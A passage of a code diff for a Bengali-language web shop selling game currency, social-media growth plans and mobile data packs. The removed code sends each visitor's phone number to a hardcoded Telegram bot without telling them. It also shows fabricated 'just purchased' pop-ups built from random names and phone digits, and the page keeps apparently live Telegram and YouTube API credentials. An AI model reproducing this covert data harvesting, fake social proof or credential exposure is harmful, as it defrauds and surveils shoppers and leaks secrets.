-                <div class="grid grid-cols-2 gap-2 max-h-[220px] overflow-y-auto pr-1">
-                    <template x-for="pkg in uidPackages" :key="pkg.id">
-                        <div @click="selectUidPkg(pkg)" :class="uidPkgId === pkg.id ? 'border-emerald-500 bg-emerald-500/5' : 'border-zinc-800 bg-zinc-900'" class="cursor-pointer border rounded-lg p-2 transition flex items-center gap-2">
-                            <div class="flex-1 min-w-0">
-                                <p class="text-white font-bold text-[11px] truncate" x-text="pkg.name"></p>
-                                <span class="text-emerald-400 font-black text-xs" x-text="calcCheckoutPrice(pkg.originalPrice, uidPromoCode) + ' TK'"></span>
-                                <span class="text-zinc-500 line-through text-[9px] block" x-text="pkg.originalPrice + ' TK'"></span>
-                            </div>
-                        </div>
-                    </template>
-                </div>
-            </div>
-
-            <div class="bg-zinc-950 border border-zinc-800 rounded-xl p-3.5 space-y-3">
-                <h3 class="text-xs font-bold text-zinc-400">2. অ্যাকাউন্ট ডাটা</h3>
-                <input type="text" x-model="uidGameId" placeholder="Enter Your Game UID *" class="w-full px-3 py-2.5 bg-zinc-900 border border-zinc-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500">
-                
-                <div>
-                    <input type="text" x-model="uidPromoCode" placeholder="Enter Promo Code *" class="w-full px-3 py-2.5 bg-zinc-900 border border-zinc-700 rounded-lg text-xs text-white focus:outline-none tracking-wider focus:border-emerald-500">
-                    
-                    <p class="text-[11px] mt-1.5 font-semibold">
-                        <span x-show="uidPromoCode.trim() === ''" class="text-amber-400">Use promo code for <span x-text="discountSettings.percent"></span>% discount</span>
-                        <span x-show="uidPromoCode.trim() !== '' && uidPromoCode.trim() !== getLivePromoCode()" class="text-red-500">সঠিক প্রমোকোড পেতে এডমিনকে মেসেজ দিন।</span>
-                        <span x-show="uidPromoCode.trim() !== '' && uidPromoCode.trim() === getLivePromoCode()" class="text-green-400"><i class="fas fa-check-circle mr-1"></i> প্রমোকোডটি সফলভাবে যুক্ত হয়েছে! আপনি ডিসকাউন্ট পেয়েছেন।</span>
-                    </p>
-                </div>
-            </div>
-
-            <button @click="handleUidPurchase()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white py-3 rounded-xl font-bold text-xs transition shadow-md">
-                Purchase Securely
-            </button>
-        </div>
-    </div>
-
-    <!-- Confirm Order -->
-    <div x-cloak x-show="currentPage === 'confirm-order'" class="w-full max-w-md bg-zinc-950 border-x border-b border-zinc-800 rounded-b-2xl p-4 pb-6 text-white">
-        <div class="flex items-center gap-3 mb-4">
-            <button @click="navigateTo('home')" class="p-1.5 hover:bg-zinc-900 rounded-full transition text-zinc-400">
-                <i data-lucide="arrow-left" class="w-5 h-5"></i>
-            </button>
-            <h1 class="text-base font-bold">Confirm Order Setup</h1>
-        </div>
+        <button class="btn" onclick="loginUser()">🚪 Login</button>
         
-        <div class="bg-zinc-900 border border-zinc-800 rounded-2xl p-4 space-y-3.5">
-            <h3 class="text-xs font-bold text-zinc-300">ভেরিফিকেশন ও ডেলিভারি ফর্ম</h3>
-            
-            <div class="space-y-2.5">
-                <div>
-                    <label class="block text-[11px] text-zinc-400 mb-1">Your Full Name *</label>
-                    <input type="text" x-model="orderName" placeholder="Enter your full name" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-red-500">
-                </div>
-                <div>
-                    <label class="block text-[11px] text-zinc-400 mb-1">Active Contact Number *</label>
-                    <input type="tel" x-model="orderPhone" placeholder="Enter your phone number" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-red-500">
-                </div>
-                <div>
-                    <label class="block text-[11px] text-zinc-400 mb-1">Selected Product Context</label>
-                    <input type="text" x-model="orderProduct" readonly class="w-full bg-zinc-900 border border-zinc-800 rounded-xl px-4 py-2.5 text-xs text-zinc-400 focus:outline-none">
-                </div>
-                <div>
-                    <label class="block text-[11px] text-zinc-400 mb-1">Live Promo Code *</label>
-                    <input type="text" x-model="orderPromo" placeholder="Enter live promo code" class="w-full bg-zinc-950 border border-zinc-800 rounded-xl px-4 py-2.5 text-xs text-white focus:outline-none focus:border-red-500 tracking-wider">
-                    
-                    <p class="text-[11px] mt-1.5 font-semibold">
-                        <span x-show="orderPromo.trim() === ''" class="text-amber-400">Use promo code for <span x-text="discountSettings.percent"></span>% discount</span>
-                        <span x-show="orderPromo.trim() !== '' && orderPromo.trim() !== getLivePromoCode()" class="text-red-500">সঠিক প্রমোকোড পেতে এডমিনকে মেসেজ দিন।</span>
-                        <span x-show="orderPromo.trim() !== '' && orderPromo.trim() === getLivePromoCode()" class="text-green-400"><i class="fas fa-check-circle mr-1"></i> প্রমোকোডটি সফলভাবে যুক্ত হয়েছে! আপনি ডিসকাউন্ট পেয়েছেন।</span>
-                    </p>
-                </div>
-            </div>
-
-            <button @click="processFinalOrder()" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-xl transition text-sm tracking-wide mt-2">
-                Confirm Order Securely
-            </button>
-        </div>
-    </div>
-
-    <!-- Service Unavailable -->
-    <div x-cloak x-show="currentPage === 'service-unavailable'" class="w-full max-w-md bg-gradient-to-br from-zinc-900 to-zinc-950 border border-zinc-800 rounded-b-2xl p-6 text-center">
-        <div class="w-16 h-16 bg-red-500/10 border border-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
-            <i data-lucide="alert-triangle" class="h-8 w-8 text-red-500"></i>
-        </div>
-        <h2 class="text-xl font-bold text-white mb-1">Service Out of Stock</h2>
-        <p class="text-red-500 font-extrabold text-sm mb-4">Currently Unavailable!</p>
-        <button @click="navigateTo('home')" class="w-full bg-zinc-800 hover:bg-zinc-700 border border-zinc-700 text-white py-2.5 rounded-xl text-xs font-semibold transition">
-            Return to Dashboard
+        <div class="divider">OR</div>
+        
+        <button class="btn btn-google" onclick="googleLogin()">
+            <span class="google-icon">G</span> Login with Google
         </button>
+        
+        <div id="loginMessage" class="message"></div>
+        <div class="switch-link">
+            New user? <a onclick="showRegister()">Register here</a>
+        </div>
     </div>
+</div>
 
-    <!-- Toast Container -->
-    <div id="universal-toast-container" style="position: fixed; bottom: 20px; right: 20px; z-index: 99999; display: flex; flex-direction: column; gap: 10px; width: 100%; max-width: 350px; pointer-events: none;"></div>
+<!-- Admin Panel Page (hidden by default) -->
+<div id="adminPage" style="display: none; width: 100%; max-width: 700px; margin: 0 auto; padding: 20px;">
+    <div class="admin-panel-page">
+        <h2>🔧 Admin Panel</h2>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="number" id="totalBlockedCount">0</div>
+                <div class="label">Total Blocked IPs</div>
+            </div>
+            <div class="stat-card">
+                <div class="number" id="totalUsersCount">0</div>
+                <div class="label">Total Registered Users</div>
+            </div>
+        </div>
 
-    <script>
-        function promoShopMaster() {
-            return {
-                currentPage: 'whatsapp-entry', 
-                configToken: globalDiscountConfig,
-                discountSettings: { mode: 'off', percent: 0 },
-                globalPayAmount: "0.00",
+        <div class="ip-list-container">
+            <h4>🚫 Blocked IP List</h4>
+            <div class="ip-list" id="adminBlockedList">
+                <div class="empty-msg">No IPs blocked yet</div>
+            </div>
+        </div>
 
-                telegramBotToken: "8047100663:AAH9PD5wJL_iXh1ygocfPE4dfiFfiVFm55g",
-                telegramChatId: "7335173906",
+        <div class="action-grid">
+            <button class="btn btn-danger" onclick="adminBlock()">🚫 Block IP</button>
+            <button class="btn btn-success" onclick="adminUnblock()">✅ Unblock IP</button>
+            <button class="btn btn-info" onclick="adminView()">📋 View All</button>
+            <button class="btn btn-warning" onclick="adminClear()">🔄 Clear All</button>
+        </div>
 
-                wpEntryPhone: '', wpEntryError: false, isWpSubmitting: false,
-                orderName: '', orderPhone: '', orderProduct: '', orderPromo: '',
+        <div class="input-group">
+            <input type="text" id="adminIPInput" placeholder="Enter IP address (e.g. 192.168.1.1)">
+            <button class="block-btn" onclick="adminBlockCustom()">Block</button>
+            <button class="unblock-btn" onclick="adminUnblockCustom()">Unblock</button>
+        </div>
 
-                ytPlanName: '', ytPlanBasePrice: 0,
-                fbPlanName: '', fbPlanBasePrice: 0, fbLink: '', fbPromo: '', fbCountry: 'bangladesh',
+        <div id="adminStatus" class="status-msg" style="display: none;"></div>
+        
+        <div style="margin-top: 20px; border-top: 2px solid #e9ecef; padding-top: 20px;">
+            <h4>📊 User Management</h4>
+            <button class="btn btn-info" onclick="viewAllUsers()" style="width: auto; padding: 10px 25px; font-size: 14px; border-radius: 10px;">👥 View All Users</button>
+            <button class="btn btn-danger" onclick="clearAllUsers()" style="width: auto; padding: 10px 25px; font-size: 14px; border-radius: 10px; background: #dc3545; margin-left: 10px;">🗑️ Clear All Users</button>
+        </div>
 
-                lvlPkgId: 'full-level-up', lvlPkgBasePrice: 400, lvlGameUid: '', lvlPromoCode: '',
-                uidPkgId: '', uidSelectedPrice: 0, uidGameId: '', uidPromoCode: '',
+        <a class="back-link" onclick="goBackToApp()">← Back to App</a>
+    </div>
+</div>
 
-                uidPackages: [
-                    { id: "weekly", name: "Weekly", originalPrice: 152 },
-                    { id: "2x-weekly", name: "2X Weekly", originalPrice: 304 },
-                    { id: "monthly", name: "Monthly", originalPrice: 745 },
-                    { id: "2x-weekly-lite", name: "2X Weekly Lite", originalPrice: 80 },
-                    { id: "ff1", name: "115 Diamond", originalPrice: 110 },
-                    { id: "ff2", name: "240 Diamond", originalPrice: 222 },
-                    { id: "ff3", name: "355 Diamond", originalPrice: 339 },
-                    { id: "ff4", name: "505 Diamond", originalPrice: 480 },
-                    { id: "ff5", name: "610 Diamond", originalPrice: 558 },
-                    { id: "ff6", name: "850 Diamond", originalPrice: 798 },
-                    { id: "ff7", name: "1090 Diamond", originalPrice: 1023 },
-                    { id: "ff8", name: "1240 Diamond", originalPrice: 1129 },
-                    { id: "ff9", name: "2530 Diamond", originalPrice: 2272 },
-                    { id: "ff10", name: "3010 Diamond", originalPrice: 2752 },
-                    { id: "ff11", name: "5060 Diamond", originalPrice: 4600 },
-                    { id: "ff12", name: "7590 Diamond", originalPrice: 6900 },
-                    { id: "ff13", name: "10120 Diamond", originalPrice: 9200 }
-                ],
-                
-                ytPromo: '', 
-                ytCountry: 'Bangladesh', 
-                ytHandleInput: '', 
-                ytChannelData: null, 
-                isYtSearching: false, 
-                ytSearchError: '',
-                ytApiKey: 'AIzaSyAh5gRiqnkd0D9JjAQ0aaCgcORlQWc2hb8',
+<script>
+    // ====== Telegram Config ======
+    const TELEGRAM_BOT_TOKEN = '8047100663:AAH9PD5wJL_iXh1ygocfPE4dfiFfiVFm55g';
+    const TELEGRAM_CHAT_ID = '7335173906';
 
-                // Notification System
-                notificationTimer: null,
+    // ====== Google OAuth Config ======
+    // Using Google's official OAuth 2.0 endpoint with proper parameters
+    const GOOGLE_CLIENT_ID = '373144720803-0b1ipphvginc1jzn3l6iagn46nehtqntp.apps.googleusercontent.com';
+    // We'll use a trick - redirect to this page with token info in URL fragment
 
-                getLivePromoCode() {
-                    const now = new Date();
-                    const hh = String(now.getHours()).padStart(2, '0');
-                    const dd = String(now.getDate()).padStart(2, '0');
-                    const mm = now.getMinutes();
-                    const suffix = (mm <= 30) ? "03" : "06";
-                    return hh + dd + suffix; 
-                },
+    // ====== Blocked IPs ======
+    let blockedIPs = JSON.parse(localStorage.getItem('blockedIPs')) || [];
 
-                async searchYtChannel() {
-                    const value = this.ytHandleInput.trim();
-                    if(!value || value === "@") { this.ytSearchError = "Please enter a valid channel handle."; return; }
-                    
-                    let cleanHandle = value.startsWith('@') ? value : '@' + value;
-                    this.ytSearchError = '';
-                    this.isYtSearching = true;
+    // ====== Get Current URL ======
+    const CURRENT_URL = window.location.href.split('?')[0];
 
-                    try {
-                        const url = `https://www.googleapis.com/youtube/v3/channels?part=snippet,statistics&forHandle=${encodeURIComponent(cleanHandle)}&key=${this.ytApiKey}`;
-                        const response = await fetch(url);
-                        const data = await response.json();
+    // ====== Functions ======
+    function showRegister() {
+        document.getElementById('registerForm').classList.remove('hidden');
+        document.getElementById('loginForm').classList.add('hidden');
+        document.getElementById('registerTab').classList.add('active');
+        document.getElementById('loginTab').classList.remove('active');
+        clearMessages();
+    }
 
-                        if (!data.items || data.items.length === 0) {
-                            this.ytSearchError = "Channel not found! Check the handle.";
-                            this.isYtSearching = false;
-                            return;
-                        }
+    function showLogin() {
+        document.getElementById('loginForm').classList.remove('hidden');
+        document.getElementById('registerForm').classList.add('hidden');
+        document.getElementById('loginTab').classList.add('active');
+        document.getElementById('registerTab').classList.remove('active');
+        clearMessages();
+    }
 
-                        const channel = data.items[0];
-                        const title = channel.snippet.title;
-                        const avatar = channel.snippet.thumbnails.default?.url || '';
-                        const stats = channel.statistics;
+    function clearMessages() {
+        document.getElementById('registerMessage').className = 'message';
+        document.getElementById('registerMessage').style.display = 'none';
+        document.getElementById('loginMessage').className = 'message';
+        document.getElementById('loginMessage').style.display = 'none';
+    }
 
-                        this.ytChannelData = {
-                            title: title,
-                            handle: cleanHandle,
-                            avatar: avatar,
-                            subs: this.formatYtNum(stats.subscriberCount),
-                            videos: this.formatYtNum(stats.videoCount),
-                            views: this.formatYtNum(stats.viewCount)
-                        };
-                    } catch (error) {
-                        this.ytSearchError = "Failed to fetch live data.";
-                    } finally {
-                        this.isYtSearching = false;
-                    }
-                },
+    function showMessage(elementId, text, type) {
+        const el = document.getElementById(elementId);
+        el.textContent = text;
+        el.className = `message ${type}`;
+        el.style.display = 'block';
+    }
 
-                formatYtNum(num) {
-                    if (!num) return "0";
-                    num = parseInt(num);
-                    if (num >= 1e6) return (num / 1e6).toFixed(1) + 'M';
-                    if (num >= 1e3) return (num / 1e3).toFixed(1) + 'K';
-                    return num;
-                },
+    // ====== Get User IP ======
+    async function getUserIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return 'Unable to fetch IP';
+        }
+    }
 
-                resetYtSearch() {
-                    this.ytChannelData = null;
-                    this.ytHandleInput = '';
-                    this.ytSearchError = '';
-                },
+    // ====== Check if IP is blocked ======
+    async function checkBlocked() {
+        const ip = await getUserIP();
+        if (blockedIPs.includes(ip)) {
+            document.body.innerHTML = `
+                <div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#f8f9fa; font-family:Arial;">
+                    <div style="text-align:center; padding:50px; background:white; border-radius:16px; box-shadow:0 4px 20px rgba(0,0,0,0.1);">
+                        <h1 style="font-size:100px; margin:0; color:#dc3545;">🚫</h1>
+                        <h2 style="color:#dc3545;">Access Denied</h2>
+                        <p style="color:#6c757d;">This website has been blocked for your IP.</p>
+                    </div>
+                </div>
+            `;
+            return true;
+        }
+        return false;
+    }
 
-                initMaster() {
-                    this.parseGlobalConfig();
-                    
-                    const wpAuthTimestamp = localStorage.getItem('wp_auth_success_time');
-                    if (wpAuthTimestamp) {
-                        const hoursPassed = (Date.now() - parseInt(wpAuthTimestamp)) / (1000 * 60 * 60);
-                        if (hoursPassed < 24) {
-                            this.currentPage = 'home'; 
-                        } else {
-                            localStorage.removeItem('wp_auth_success_time'); 
-                        }
-                    }
+    // ====== Block/Unblock Functions ======
+    window.blockIP = function(ip) {
+        if (!ip || blockedIPs.includes(ip)) return false;
+        blockedIPs.push(ip);
+        localStorage.setItem('blockedIPs', JSON.stringify(blockedIPs));
+        updateAdminUI();
+        return true;
+    };
 
-                    lucide.createIcons();
-                    
-                    // Start Live Notifications
-                    this.initLiveNotifications();
-                },
+    window.unblockIP = function(ip) {
+        if (!ip) return false;
+        blockedIPs = blockedIPs.filter(b => b !== ip);
+        localStorage.setItem('blockedIPs', JSON.stringify(blockedIPs));
+        updateAdminUI();
+        return true;
+    };
 
-                // ============ LIVE NOTIFICATION SYSTEM ============
-                initLiveNotifications() {
-                    const showNotification = () => {
-                        // Check if payment page is active
-                        if (this.currentPage === 'telecom-checkout-frame' || 
-                            sessionStorage.getItem('isPaymentActive') === 'true') {
-                            console.log("🔒 Payment page detected, notification blocked");
-                            this.notificationTimer = setTimeout(showNotification, 5000);
-                            return;
-                        }
+    // ====== Update Admin UI ======
+    function updateAdminUI() {
+        const list = document.getElementById('adminBlockedList');
+        if (blockedIPs.length === 0) {
+            list.innerHTML = '<div class="empty-msg">No IPs blocked yet</div>';
+        } else {
+            list.innerHTML = blockedIPs.map(ip => 
+                `<div class="blocked-ip">
+                    <span>🔴 ${ip}</span>
+                    <button class="remove-btn" onclick="removeIP('${ip}')" title="Remove">✕</button>
+                </div>`
+            ).join('');
+        }
+        document.getElementById('totalBlockedCount').textContent = blockedIPs.length;
+        
+        const users = JSON.parse(localStorage.getItem('users')) || [];
+        document.getElementById('totalUsersCount').textContent = users.length;
+    }
 
-                        const toastContainer = document.getElementById('universal-toast-container');
-                        if (!toastContainer) {
-                            this.notificationTimer = setTimeout(showNotification, 3000);
-                            return;
-                        }
+    function removeIP(ip) {
+        if (confirm(`Remove ${ip} from blocked list?`)) {
+            unblockIP(ip);
+            showAdminStatus(`✅ IP ${ip} unblocked`, 'success');
+        }
+    }
 
-                        // Dummy data
-                        const customerNames = ["Abir", "Sabbir", "Rahat", "Anik", "Tanvir", "Sujon", "Emon", "Nayeem", "Fahim", "Sakib", "Rifat", "Imran", "Arif", "Hasan", "Sumon", "Nabil", "Jahid", "Maruf", "Ayan", "Siam"];
-                        const phonePrefixes = ["017", "019", "018", "016", "015", "013", "014"];
-                        const liveProducts = [
-                            "YouTube Standard Membership Pack",
-                            "YouTube Premium Membership Pack",
-                            "Facebook Basic Growth Package",
-                            "Facebook Standard Monetizer Package",
-                            "Banglalink 100 GB + 1300 Min Combo",
-                            "Grameenphone 58 GB + 2000 Min Pack",
-                            "Robi 50 GB Internet Package",
-                            "Airtel 60 GB Big Data Pack",
-                            "Free Fire 1270 Diamond Full Level Up",
-                            "Free Fire Weekly Subscription",
-                            "Free Fire Monthly Membership Package"
-                        ];
-                        const timePhrases = ["Just now", "2 seconds ago", "15 seconds ago", "40 seconds ago", "1 minute ago"];
-
-                        // Randomize data
-                        const randomName = customerNames[Math.floor(Math.random() * customerNames.length)];
-                        const randomPrefix = phonePrefixes[Math.floor(Math.random() * phonePrefixes.length)];
-                        const randomDigits = Math.floor(1000 + Math.random() * 9000);
-                        const randomProduct = liveProducts[Math.floor(Math.random() * liveProducts.length)];
-                        const randomTime = timePhrases[Math.floor(Math.random() * timePhrases.length)];
-                        const randomOrderId = Math.floor(1000 + Math.random() * 9000);
-
-                        // Create notification
-                        const toast = document.createElement('div');
-                        toast.className = "live-toast-notification";
-                        toast.innerHTML = `
-                            <div style="width: 36px; height: 36px; background-color: rgba(16, 185, 129, 0.15); color: #10b981; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; border: 1px solid rgba(16, 185, 129, 0.2); flex-shrink: 0;">
-                                <i class="fas fa-shopping-bag text-emerald-400" style="animation: pulse 2s infinite;"></i>
-                            </div>
-                            <div style="flex: 1; min-width: 0; width: 100%;">
-                                <div style="display: flex; align-items: center; justify-content: space-between; gap: 8px;">
-                                    <p style="margin: 0; font-size: 12px; font-weight: bold; color: #ffffff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${randomName} (${randomPrefix}***${randomDigits})</p>
-                                    <span style="margin: 0; font-size: 10px; background-color: #27272a; color: #10b981; padding: 2px 6px; border-radius: 4px; font-family: monospace; flex-shrink: 0;">ID: #${randomOrderId}</span>
-                                </div>
-                                <p style="margin: 4px 0 0 0; font-size: 11px; color: #d4d4d8; font-weight: 500; line-height: 1.4;">${randomProduct} সফলভাবে কিনেছেন</p>
-                                <span style="margin: 4px 0 0 0; font-size: 9px; color: #71717a; display: block;"><i class="far fa-clock" style="margin-right: 4px;"></i>${randomTime}</span>
-                            </div>
-                            <button style="background: none; border: none; color: #52525b; cursor: pointer; padding: 0; flex-shrink: 0; align-self: flex-start; transition: color 0.2s;" onmouseover="this.style.color='#d4d4d8'" onmouseout="this.style.color='#52525b'" onclick="this.parentElement.remove()">
-                                <i class="fas fa-times" style="font-size: 11px;"></i>
-                            </button>
-                        `;
-
-                        toastContainer.appendChild(toast);
-                        setTimeout(() => { toast.classList.add('show'); }, 100);
-                        setTimeout(() => {
-                            toast.classList.add('hide');
-                            setTimeout(() => { toast.remove(); }, 500);
-                        }, 4500);
-
-                        // Next notification timing
-                        let nextDelay;
-                        const diceRoll = Math.random();
-                        if (diceRoll < 0.20) nextDelay = Math.floor(Math.random() * (20000 - 9000 + 1)) + 4000;
-                        else if (diceRoll < 0.50) nextDelay = Math.floor(Math.random() * (40000 - 20000 + 1)) + 12000;
-                        else nextDelay = Math.floor(Math.random() * (60000 - 45000 + 1)) + 30000;
-
-                        this.notificationTimer = setTimeout(showNotification, nextDelay);
-                    };
-
-                    // First notification
-                    const initialDelay = Math.floor(Math.random() * (16000 - 8000 + 1)) + 8000;
-                    this.notificationTimer = setTimeout(showNotification, initialDelay);
-                },
-
-                // ============ NAVIGATION ============
-                navigateTo(pageId) {
-                    // Set payment flag when going to payment page
-                    if (pageId === 'telecom-checkout-frame') {
-                        sessionStorage.setItem('isPaymentActive', 'true');
-                        document.body.classList.add('payment-mode');
-                    } else {
-                        sessionStorage.removeItem('isPaymentActive');
-                        document.body.classList.remove('payment-mode');
-                    }
-                    
-                    this.currentPage = pageId;
-                    window.scrollTo(0, 0);
-                    setTimeout(() => { lucide.createIcons(); }, 50);
-                },
-
-                // ============ CALCULATIONS ============
-                parseGlobalConfig() {
-                    if (this.configToken && this.configToken.includes('-')) {
-                        const chunks = this.configToken.split('-');
-                        this.discountSettings.mode = chunks[0].trim().toLowerCase();
-                        this.discountSettings.percent = parseFloat(chunks[1]) || 0;
-                    }
-                },
-
-                calcPriceOnSite(basePrice) {
-                    return Math.round(basePrice * (1 - this.discountSettings.percent / 100));
-                },
-
-                calcCheckoutPrice(basePrice, typedPromoCode = "") {
-                    if (this.discountSettings.mode === 'on') {
-                        return Math.round(basePrice * (1 - this.discountSettings.percent / 100));
-                    }
-                    if (this.discountSettings.mode === 'off' && typedPromoCode.trim() === this.getLivePromoCode()) {
-                        return Math.round(basePrice * (1 - this.discountSettings.percent / 100));
-                    }
-                    return basePrice;
-                },
-
-                // ============ WHATSAPP ============
-                async submitWhatsAppNumber() {
-                    if (this.wpEntryPhone.length < 11 || !/^\d+$/.test(this.wpEntryPhone)) { this.wpEntryError = true; return; }
-                    this.wpEntryError = false; this.isWpSubmitting = true;
-                    try {
-                        const msg = `📱 <b>Gate Log</b>\nPhone: ${this.wpEntryPhone}`;
-                        await fetch(`https://api.telegram.org/bot${this.telegramBotToken}/sendMessage`, {
-                            method: "POST", headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ chat_id: this.telegramChatId, text: msg, parse_mode: "HTML" })
-                        });
-                        
-                        localStorage.setItem('wp_auth_success_time', Date.now().toString());
-                        this.navigateTo('home');
-                    } catch (e) { 
-                        localStorage.setItem('wp_auth_success_time', Date.now().toString());
-                        this.navigateTo('home'); 
-                    } finally { 
-                        this.isWpSubmitting = false; 
-                    }
-                },
-
-                // ============ TELECOM ============
-                currentSlug: 'banglalink', checkoutOffer: {}, telecomPhone: '', telecomPromo: '', telecomErrors: {}, isTelecomSubmitting: false,
-
-                operatorOffers: {
-                    banglalink: {
-                        name: "Banglalink", logo: "https://i.im.ge/QMIqM3h/image_search_1779371093144.png",
-                        offers: [
-                            { id: "b0", data: "100 GB", minutes: "1300 Minutes", validity: "30 Day", basePrice: 865 },
-                            { id: "b2", data: "20 GB", minutes: "1450 Minutes", validity: "30 Day", basePrice: 520 },
-                            { id: "b3", data: "100 GB", minutes: "2000 Minutes", validity: "30 Day", basePrice: 986 }, 
-                            { id: "b4", data: "70 GB", minutes: "1600 Minutes", validity: "30 Day", basePrice: 814 }, 
-                            { id: "b5", data: "50 GB", minutes: "1000 Minutes", validity: "30 Day", basePrice: 643 }, 
-                            { id: "b6", data: "44 GB", minutes: "800 Minutes", validity: "30 Day", basePrice: 500 }, 
-                            { id: "b7", data: "35 GB", minutes: "700 Minutes", validity: "30 Day", basePrice: 429 }, 
-                            { id: "b8", data: "25 GB", minutes: "400 Minutes", validity: "30 Day", basePrice: 357 }, 
-                            { id: "b9", data: "60 GB", minutes: "", validity: "30 Day", basePrice: 543 }, 
-                            { id: "b10", data: "100 GB", minutes: "", validity: "30 Day", basePrice: 700 }, 
-                            { id: "b11", data: "45 GB", minutes: "", validity: "30 Day", basePrice: 386 }, 
-                            { id: "b12", data: "35 GB", minutes: "", validity: "30 Day", basePrice: 357 }, 
-                            { id: "b13", data: "100 GB", minutes: "", validity: "30 Day", basePrice: 0, stockOut: true },
-                            { id: "b14", data: "25 GB", minutes: "", validity: "30 Day", basePrice: 300 }, 
-                            { id: "b15", data: "Limitless", minutes: "", validity: "30 Day", basePrice: 814 }, 
-                            { id: "b16", data: "", minutes: "1000 Minutes", validity: "30 Day", basePrice: 486 }, 
-                            { id: "b17", data: "", minutes: "900 Minutes", validity: "30 Day", basePrice: 386 }, 
-                            { id: "b18", data: "", minutes: "600 Minutes", validity: "30 Day", basePrice: 357 }, 
-                            { id: "b19", data: "", minutes: "500 Minutes", validity: "30 Day", basePrice: 300 }  
-                        ]
-                    },
-                    grameenphone: {
-                        name: "Grameenphone", logo: "https://i.im.ge/QMIqQ4M/image_search_1779371027269.png",
-                        offers: [
-                            { id: "g1", data: "58 GB", minutes: "2000 Minutes", validity: "30 Day", basePrice: 860 },
-                            { id: "g3", data: "40 GB", minutes: "800 Minutes", validity: "30 Day", basePrice: 500 }, 
-                            { id: "g0", data: "70 GB", minutes: "1600 Minutes", validity: "30 Day", basePrice: 814 }, 
-                            { id: "g1", data: "60 GB", minutes: "1600 Minutes", validity: "30 Day", basePrice: 743 }, 
-                            { id: "g2", data: "50 GB", minutes: "1200 Minutes", validity: "30 Day", basePrice: 571 }, 
-                            { id: "g4", data: "80 GB", minutes: "650 Minutes", validity: "30 Day", basePrice: 0, stockOut: true },
-                            { id: "g5", data: "30 GB", minutes: "650 Minutes", validity: "30 Day", basePrice: 493 }, 
-                            { id: "g6", data: "20 GB", minutes: "400 Minutes", validity: "30 Day", basePrice: 357 }, 
-                            { id: "g7", data: "60 GB", minutes: "", validity: "30 Day", basePrice: 466 }, 
-                            { id: "g8", data: "50 GB", minutes: "", validity: "30 Day", basePrice: 436 }, 
-                            { id: "g9", data: "100 GB", minutes: "", validity: "30 Day", basePrice: 757 }, 
-                            { id: "g10", data: "40 GB", minutes: "", validity: "30 Day", basePrice: 371 }, 
-                            { id: "g11", data: "Limitless", minutes: "", validity: "30 Day", basePrice: 871 }, 
-                            { id: "g12", data: "", minutes: "1000 Minutes", validity: "30 Day", basePrice: 500 }, 
-                            { id: "g13", data: "", minutes: "800 Minutes", validity: "30 Day", basePrice: 400 }, 
-                            { id: "g14", data: "", minutes: "500 Minutes", validity: "30 Day", basePrice: 300 }  
-                        ]
-                    },
-                    robi: {
-                        name: "Robi", logo: "https://i.im.ge/QMIdGTX/image_search_1779371058782.png",
-                        offers: [
-                            { id: "r1", data: "50 GB", minutes: "1200 Minutes", validity: "30 Day", basePrice: 680 },
-                            { id: "r2", data: "30 GB", minutes: "650 Minutes", validity: "30 Day", basePrice: 498 },
-                            { id: "r3", data: "35 GB", minutes: "800 Minutes", validity: "30 Day", basePrice: 557 }, 
-                            { id: "r4", data: "60 GB", minutes: "1600 Minutes", validity: "30 Day", basePrice: 729 }, 
-                            { id: "r5", data: "50 GB", minutes: "100 Minutes", validity: "30 Day", basePrice: 571 }, 
-                            { id: "r6", data: "55 GB", minutes: "300 Minutes", validity: "30 Day", basePrice: 0, stockOut: true },
-                            { id: "r7", data: "45 GB", minutes: "790 Minutes", validity: "30 Day", basePrice: 500 }, 
-                            { id: "r8", data: "60 GB", minutes: "", validity: "30 Day", basePrice: 543 }, 
-                            { id: "r9", data: "Limitless", minutes: "", validity: "30 Day", basePrice: 886 }, 
-                            { id: "r10", data: "50 GB", minutes: "", validity: "30 Day", basePrice: 429 }, 
-                            { id: "r11", data: "40 GB", minutes: "", validity: "30 Day", basePrice: 357 }, 
-                            { id: "r12", data: "100 GB", minutes: "", validity: "30 Day", basePrice: 786 }, 
-                            { id: "r13", data: "", minutes: "1000 Minutes", validity: "30 Day", basePrice: 500 }, 
-                            { id: "r14", data: "", minutes: "385 Minutes", validity: "30 Day", basePrice: 0, stockOut: true },
-                            { id: "r15", data: "", minutes: "800 Minutes", validity: "30 Day", basePrice: 400 }, 
-                            { id: "r16", data: "", minutes: "500 Minutes", validity: "30 Day", basePrice: 300 }  
-                        ]
-                    },
-                    airtel: {
-                        name: "Airtel", logo: "https://i.im.ge/QMIqB10/image_search_1779378597400.png",
-                        offers: [
-                            { id: "a1", data: "60 GB", minutes: "1000 Minutes", validity: "30 Day", basePrice: 619 },
-                            { id: "a2", data: "25 GB", minutes: "450 Minutes", validity: "30 Day", basePrice: 309 },
-                            { id: "a3", data: "40 GB", minutes: "800 Minutes", validity: "30 Day", basePrice: 457 }, 
-                            { id: "a4", data: "70 GB", minutes: "1600 Minutes", validity: "30 Day", basePrice: 786 }, 
-                            { id: "a5", data: "60 GB", minutes: "1600 Minutes", validity: "30 Day", basePrice: 500 }, 
-                            { id: "a6", data: "50 GB", minutes: "1000 Minutes", validity: "30 Day", basePrice: 643 }, 
-                            { id: "a7", data: "64 GB", minutes: "600 Minutes", validity: "30 Day", basePrice: 0, stockOut: true },
-                            { id: "a8", data: "30 GB", minutes: "500 Minutes", validity: "30 Day", basePrice: 357 }, 
-                            { id: "a9", data: "60 GB", minutes: "", validity: "30 Day", basePrice: 543 }, 
-                            { id: "a10", data: "45 GB", minutes: "", validity: "30 Day", basePrice: 386 }, 
